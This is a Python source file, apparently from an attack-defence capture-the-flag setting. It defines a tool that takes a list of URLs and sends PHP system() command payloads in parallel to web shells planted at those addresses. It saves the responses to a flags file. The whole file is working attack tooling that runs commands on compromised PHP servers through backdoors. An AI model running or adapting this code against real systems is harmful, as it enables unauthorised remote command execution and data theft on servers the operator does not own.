import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich import print as rich_print
from typing import Optional


class PHPConnectionTester:
    def __init__(self, urls_file: str = 'urls.txt', output_file: str = 'flags.txt'):
        self.urls_file = urls_file
        self.output_file = output_file
        self.session = requests.Session()

    def send_request(self, url: str, payload: dict, headers: dict, method: str) -> Optional[requests.Response]:
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=payload, headers=headers, timeout=1)
            else:
                response = self.session.post(url, data=payload, headers=headers, timeout=1)
            return response
        except requests.exceptions.Timeout:
            rich_print(f"请求 {url} 超时，超时时间为1秒。")
        except requests.exceptions.RequestException as e:
            rich_print(f"请求失败：{e}")
        return None

    def handle_response(self, url: str, response: requests.Response):
        rich_print("=======================================")
        rich_print(f"URL: {url}")
        rich_print(f"状态码: {response.status_code}")
        if response.status_code == 200:
            result = response.text
            rich_print(f"响应: {result}")
            with open(self.output_file, 'a', encoding='utf-8') as file:
                file.write(f"[php][{datetime.now()}] {url} - {result}")
        else:
            rich_print("执行命令失败。")
        rich_print("=======================================")

    def test_php_connection(self, url: str, key: str, command: str, method: str = 'POST', use_system: bool = False):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        if not use_system:
            command = f"system('{command}');"
        payload = {key: command}
        response = self.send_request(url, payload, headers, method)
        if response:
            self.handle_response(url, response)

    def test_all_urls(self, key: str, command: str = 'echo "Connection Successful"', method: str = 'POST',
                      use_system: bool = False, max_workers: int = 20):
        try:
            with open(self.urls_file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]

            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_url = {executor.submit(self.test_php_connection, url, key, command, method, use_system): url
                                 for url in urls}
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                    except Exception as e:
                        rich_print(f"{url} 异常: {e}")
        except FileNotFoundError:
            rich_print(f"文件未找到: {self.urls_file}")
